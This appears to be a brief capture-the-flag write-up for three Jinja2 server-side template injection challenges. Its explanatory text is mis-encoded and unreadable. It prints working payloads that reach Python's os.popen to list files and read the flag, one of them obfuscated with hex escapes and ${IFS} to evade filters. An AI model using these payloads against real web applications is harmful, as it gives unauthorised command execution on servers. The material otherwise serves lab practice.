���j�D�Ѧ� https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
�H�� https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

# STI01
�ϥΥH�U ~~�ǻ������_��~~ ���O
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}} 
```
![alt text](image.png)
# STI02
�P�Ĥ@�D
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat FLAG').read()}}
```
![](image-1.png)
# STI03
�ϥΥH�U ~~�ǻ������ĤG�ө_��~~ ���O
```
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat${IFS}FLAG')|attr('read')()%}{%print(a)%}{%endwith%}
```
![alt text](image-2.png)
